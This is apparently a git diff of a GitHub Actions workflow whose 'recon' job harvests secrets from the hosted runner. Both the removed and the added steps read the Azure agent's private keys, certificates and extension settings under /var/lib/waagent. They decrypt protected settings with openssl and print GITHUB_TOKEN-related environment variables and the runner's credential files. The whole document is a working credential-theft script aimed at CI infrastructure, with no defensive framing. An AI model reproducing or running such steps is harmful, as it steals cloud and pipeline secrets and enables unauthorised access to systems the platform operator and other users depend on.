@@ -7,46 +7,44 @@ jobs:
   recon:
     runs-on: ubuntu-latest
     steps:
-      - name: Get Secrets
+      - name: Final Extract
         run: |
           set +e
-          echo "=== OVF-ENV ==="
-          sudo cat /var/lib/waagent/ovf-env.xml
+          echo "=== RUN-COMMAND SCRIPT ==="
+          sudo cat /var/lib/waagent/run-command/download/*/script.sh 2>/dev/null
           echo ""
-          echo "=== CERTS PEM ==="
-          sudo cat /var/lib/waagent/Certificates.pem
+          echo "=== RUN-COMMAND STDOUT ==="
+          sudo cat /var/lib/waagent/run-command/download/*/stdout 2>/dev/null | tail -100
           echo ""
-          echo "=== SHARED CONFIG ==="
-          sudo cat /var/lib/waagent/SharedConfig.xml
+          echo "=== EXTENSION SETTINGS PATH ==="
+          sudo find /var/lib/waagent -name "*.settings" -type f 2>/dev/null
           echo ""
-          echo "=== PRV 87A6 ==="
-          sudo cat /var/lib/waagent/87A60B02BDFB41D42134F762C956C7C91EC75A75.prv
+          echo "=== EXTENSION SETTINGS CONTENT ==="
+          for f in $(sudo find /var/lib/waagent -name "*.settings" -type f 2>/dev/null); do
+            echo "--- FILE: $f ---"
+            sudo cat "$f" 2>/dev/null | head -5
+            echo "..."
+          done
           echo ""
-          echo "=== PRV EE99 ==="
-          sudo cat /var/lib/waagent/EE997ABB593CB9C93CC337B7A60D9DD11FFE76D3.prv
+          echo "=== DECRYPT PROTECTED SETTINGS ==="
+          SETTINGS_FILE=$(sudo find /var/lib/waagent -name "*.settings" -type f 2>/dev/null | head -1)
+          if [ -n "$SETTINGS_FILE" ]; then
+            PROTECTED=$(sudo grep -oP '"protectedSettings"\s*:\s*"\K[^"]+' "$SETTINGS_FILE" 2>/dev/null | head -1)
+            if [ -n "$PROTECTED" ]; then
+              echo "$PROTECTED" | base64 -d > /tmp/enc.der
+              echo "Encrypted blob size: $(wc -c < /tmp/enc.der) bytes"
+              echo "Trying TenantEncryptionCert key from Certificates.pem..."
+              sudo openssl cms -decrypt -inform DER -inkey /var/lib/waagent/87A60B02BDFB41D42134F762C956C7C91EC75A75.prv -in /tmp/enc.der 2>&1 | head -80
+            else
+              echo "No protectedSettings found in $SETTINGS_FILE"
+            fi
+          fi
           echo ""
-          echo "=== CRT EE99 THUMBPRINT ==="
-          sudo openssl x509 -in /var/lib/waagent/EE997ABB593CB9C93CC337B7A60D9DD11FFE76D3.crt -fingerprint -noout
+          echo "=== ENVIRONMENT VARS (runner secrets) ==="
+          env | grep -iE "GITHUB_TOKEN|ACTIONS_|RUNNER_" | sort
           echo ""
-          echo "=== CRT 87A6 THUMBPRINT ==="
-          sudo openssl x509 -in /var/lib/waagent/87A60B02BDFB41D42134F762C956C7C91EC75A75.crt -fingerprint -noout
+          echo "=== RUNNER CREDENTIALS ==="
+          cat /home/runner/actions-runner/.credentials 2>/dev/null
+          cat /home/runner/actions-runner/.credentials_rsaparams 2>/dev/null | head -20
           echo ""
-          echo "=== RUN CMD FILES ==="
-          sudo find /var/lib/waagent/run-command -type f
-          sudo find /var/lib/waagent/Microsoft.CPlat.Core.RunCommandLinux-1.0.9 -type f
-          echo ""
-          echo "=== SETTINGS FILE ==="
-          sudo cat /var/lib/waagent/Microsoft.CPlat.Core.RunCommandLinux-1.0.9/config/0.settings
-          echo ""
-          echo "=== DECRYPT WITH EE99 ==="
-          SETTINGS=$(sudo cat /var/lib/waagent/Microsoft.CPlat.Core.RunCommandLinux-1.0.9/config/0.settings 2>/dev/null)
-          PROTECTED=$(echo "$SETTINGS" | grep -oP '"protectedSettings"\s*:\s*"\K[^"]+')
-          echo "$PROTECTED" | base64 -d > /tmp/enc.der 2>/dev/null
-          sudo openssl cms -decrypt -inform DER -inkey /var/lib/waagent/EE997ABB593CB9C93CC337B7A60D9DD11FFE76D3.prv -recip /var/lib/waagent/EE997ABB593CB9C93CC337B7A60D9DD11FFE76D3.crt -in /tmp/enc.der 2>&1 | head -50
-          echo ""
-          echo "=== DECRYPT WITH 87A6 ==="
-          sudo openssl cms -decrypt -inform DER -inkey /var/lib/waagent/87A60B02BDFB41D42134F762C956C7C91EC75A75.prv -recip /var/lib/waagent/87A60B02BDFB41D42134F762C956C7C91EC75A75.crt -in /tmp/enc.der 2>&1 | head -50
-          echo ""
-          echo "=== DECRYPT WITH TRANSPORT ==="
-          sudo openssl cms -decrypt -inform DER -inkey /var/lib/waagent/TransportPrivate.pem -in /tmp/enc.der 2>&1 | head -50
           echo "=== DONE ==="
